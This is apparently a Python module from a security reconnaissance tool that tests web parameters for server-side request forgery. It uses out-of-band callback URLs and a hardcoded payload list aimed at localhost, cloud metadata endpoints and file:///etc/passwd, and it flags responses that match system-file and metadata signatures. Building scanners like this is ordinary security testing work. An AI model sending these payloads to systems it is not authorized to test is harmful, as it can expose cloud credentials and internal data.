from __future__ import annotations

import json
import uuid
import asyncio
import hashlib
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stage_base import Stage, note_missing_tool
from recon_cli.utils import time as time_utils
from recon_cli.utils.oast import InteractshSession
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class SSRFValidatorStage(Stage):
    name = "ssrf_validator"

    SSRF_PARAMS = {
        "url", "uri", "link", "host", "domain", "site", "callback", "dest", "next",
    }
    INTERNAL_PAYLOADS = (
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
    )
    INTERNAL_INDICATORS = (
        "127.0.0.1", "localhost", "169.254.169.254", "latest/meta-data",
        "instance-id", "ami-id", "computeMetadata", "root:x:0:0",
        "connection refused", "econnrefused",
    )

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_ssrf_validator", True))

    async def run_async(self, context: PipelineContext) -> None:
        runtime = context.runtime_config
        max_urls = max(1, int(getattr(runtime, "ssrf_validator_max_urls", 25)))
        max_per_host = max(1, int(getattr(runtime, "ssrf_validator_max_per_host", 6)))
        min_score = int(getattr(runtime, "ssrf_validator_min_score", 40))
        timeout = max(1, int(getattr(runtime, "ssrf_validator_timeout", 10)))
        verify_tls = bool(getattr(runtime, "verify_tls", True))
        enable_oast = bool(getattr(runtime, "ssrf_validator_enable_oast", True))
        enable_internal = bool(getattr(runtime, "ssrf_validator_enable_internal", True))
        oast_backend = str(getattr(runtime, "oast_backend", "interactsh")).lower()
        
        candidates = self._collect_candidates(context, min_score=min_score, max_urls=max_urls, max_per_host=max_per_host)
        stats = context.record.metadata.stats.setdefault("ssrf_validator", {})
        if not candidates:
            stats.update({"attempted": 0, "confirmed": 0, "failed": 0, "skipped": 0, "candidates": 0})
            context.manager.update_metadata(context.record)
            context.logger.info("No SSRF validator candidates")
            return

        artifacts_dir = context.record.paths.ensure_subdir("ssrf_validator")
        probes: List[Dict[str, object]] = []
        interactions: List[Dict[str, object]] = []
        confirmed = 0
        confirmed_oast = 0
        confirmed_internal = 0
        failed = 0
        skipped = 0
        attempted = 0
        confirmed_keys: Set[Tuple[str, str]] = set()

        client_config = HTTPClientConfig(
            max_concurrent=15,
            total_timeout=float(timeout),
            verify_ssl=verify_tls,
            requests_per_second=float(getattr(runtime, "ssrf_validator_rps", 20.0))
        )

        async with AsyncHTTPClient(client_config) as client:
            if enable_oast and oast_backend == "interactsh":
                output_path = artifacts_dir / "interactsh.json"
                session = InteractshSession(output_path, logger=context.logger, domain_override=getattr(runtime, "oast_domain", None))
                if not session.start():
                    context.logger.warning("SSRF OAST session failed; skipping callback validation")
                    note_missing_tool(context, "interactsh-client")
                else:
                    try:
                        oast_tokens: Dict[str, Dict[str, object]] = {}
                        for entry in candidates:
                            url, param = str(entry["url"]), str(entry["param"])
                            if (url, param) in confirmed_keys: continue
                            
                            token = uuid.uuid4().hex[:10]
                            oast_url = session.make_url(token)
                            if not oast_url: continue
                            
                            test_url, method, data, json_body = self._prepare_payload_request(entry, oast_url)
                            if not context.url_allowed(test_url): skipped += 1; continue
                            
                            attempted += 1
                            headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator-oast"})
                            
                            try:
                                resp = await client._request(method=method, url=test_url, headers=headers, data=data, json=json_body)
                                status = resp.status
                                probes.append({"type": "ssrf_oast_probe", "url": test_url, "base_url": url, "param": param, "status": status, "method": method, "oast_url": oast_url})
                                oast_tokens[token] = {"url": url, "param": param, "probe": test_url, "method": method, "payload": oast_url}
                            except Exception:
                                failed += 1; continue

                        if oast_tokens:
                            await asyncio.sleep(getattr(runtime, "ssrf_validator_oast_wait_seconds", 30))
                            collected = session.collect_interactions(list(oast_tokens.keys()))
                            interactions = [interaction.raw for interaction in collected]
                            for interaction in collected:
                                info = oast_tokens.get(interaction.token)
                                if not info or (str(info["url"]), str(info["param"])) in confirmed_keys: continue
                                
                                confirmed_keys.add((str(info["url"]), str(info["param"])))
                                signal_id = context.emit_signal("ssrf_confirmed", "url", str(info["url"]), confidence=1.0, source="ssrf-validator", tags=["ssrf", "confirmed", "oast"], evidence={"interaction": interaction.raw})
                                finding = {
                                    "type": "finding", "finding_type": "ssrf", "source": "ssrf-validator", "url": info["url"], "hostname": urlparse(str(info["url"])).hostname,
                                    "description": "SSRF confirmed via OAST interaction",
                                    "details": {"probe": info.get("probe"), "parameter": info.get("param"), "interaction": interaction.raw},
                                    "proof": interaction.raw, "tags": ["ssrf", "confirmed", "oast"], "score": 92,
                                    "priority": "high", "severity": "critical", "confidence_label": "verified", "evidence_id": signal_id or None,
                                }
                                if context.results.append(finding):
                                    confirmed += 1; confirmed_oast += 1
                    finally:
                        session.stop()

            if enable_internal:
                for entry in candidates:
                    url, param = str(entry["url"]), str(entry["param"])
                    if (url, param) in confirmed_keys: continue
                    
                    # 1. Baseline
                    b_url, b_method, b_data, b_json = self._prepare_payload_request(entry, "https://example.com/")
                    b_status, b_body = await self._fetch_response(client, context, b_url, b_method, b_data, b_json)
                    
                    # 2. Probes
                    for payload in self.INTERNAL_PAYLOADS:
                        test_url, method, data, json_body = self._prepare_payload_request(entry, payload)
                        if not context.url_allowed(test_url): skipped += 1; continue
                        
                        attempted += 1
                        status, body = await self._fetch_response(client, context, test_url, method, data, json_body)
                        if status == 0: failed += 1; continue
                        
                        if self._looks_internal(body, baseline_body=b_body, status=status, baseline_status=b_status):
                            confirmed_keys.add((url, param))
                            signal_id = context.emit_signal("ssrf_internal_confirmed", "url", url, confidence=0.8, source="ssrf-validator", tags=["ssrf", "confirmed", "internal"], evidence={"payload": payload, "status_code": status})
                            finding = {
                                "type": "finding", "finding_type": "ssrf", "source": "ssrf-validator", "url": url, "hostname": urlparse(url).hostname,
                                "description": "SSRF likely confirmed by internal target response signature",
                                "details": {"probe": test_url, "parameter": param, "payload": payload, "status_code": status, "response_snippet": body[:600]},
                                "proof": body[:600], "tags": ["ssrf", "confirmed", "internal"], "score": 86,
                                "priority": "high", "severity": "high", "confidence_label": "high", "evidence_id": signal_id or None,
                            }
                            if context.results.append(finding):
                                confirmed += 1; confirmed_internal += 1
                            break

        # Finalize
        artifact_path = artifacts_dir / "ssrf_validator.json"
        artifact_path.write_text(json.dumps({"probes": probes, "interactions": interactions, "confirmed": confirmed, "confirmed_oast": confirmed_oast, "confirmed_internal": confirmed_internal, "timestamp": time_utils.iso_now()}, indent=2, sort_keys=True), encoding="utf-8")
        stats.update({"attempted": attempted, "confirmed": confirmed, "confirmed_oast": confirmed_oast, "confirmed_internal": confirmed_internal, "failed": failed, "skipped": skipped, "candidates": len(candidates), "artifact": str(artifact_path.relative_to(context.record.paths.root))})
        context.manager.update_metadata(context.record)

    async def _fetch_response(self, client: AsyncHTTPClient, context: PipelineContext, url: str, method: str, data: Any, json_body: Any) -> Tuple[int, str]:
        headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator-internal"})
        try:
            resp = await client._request(method=method, url=url, headers=headers, data=data, json=json_body)
            return resp.status, resp.body
        except Exception:
            return 0, ""

    def _collect_candidates(self, context: PipelineContext, *, min_score: int, max_urls: int, max_per_host: int) -> List[Dict[str, Any]]:
        grouped = defaultdict(list)
        seen = set()
        for entry in context.iter_results():
            url = str(entry.get("url") or "").strip()
            if not url: continue
            host = urlparse(url).hostname or ""
            score = int(entry.get("score", 0) or 0)
            if score < min_score: continue
            
            method = str(entry.get("method") or "get").lower()
            params = parse_qsl(urlparse(url).query, keep_blank_values=True)
            for key, _ in params:
                name = str(key).strip().lower()
                if name in self.SSRF_PARAMS and (url, name) not in seen:
                    seen.add((url, name))
                    grouped[host].append({"url": url, "param": name, "method": method, "score": score})
            
            if entry.get("finding_type") == "ssrf":
                pname = str(entry.get("parameter") or "url").lower()
                if pname in self.SSRF_PARAMS and (url, pname) not in seen:
                    seen.add((url, pname))
                    grouped[host].append({"url": url, "param": pname, "method": method, "score": max(score, 80)})

        selected = []
        for items in grouped.values():
            items.sort(key=lambda x: x["score"], reverse=True)
            selected.extend(items[:max_per_host])
        selected.sort(key=lambda x: x["score"], reverse=True)
        return selected[:max_urls]

    def _prepare_payload_request(self, entry: Dict[str, Any], payload: str) -> Tuple[str, str, Any, Any]:
        url, param, method = str(entry["url"]), str(entry["param"]), str(entry["method"])
        if method == "get":
            parsed = urlparse(url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            updated = []
            replaced = False
            for k, v in pairs:
                if k == param and not replaced: updated.append((k, payload)); replaced = True
                else: updated.append((k, v))
            if not replaced: updated.append((param, payload))
            return urlunparse(parsed._replace(query=urlencode(updated, doseq=True))), "get", None, None
        return url, method, {param: payload}, None

    def _looks_internal(self, body: str, *, baseline_body: str, status: int, baseline_status: int) -> bool:
        lowered = (body or "").lower()
        return any(indicator in lowered for indicator in self.INTERNAL_INDICATORS)
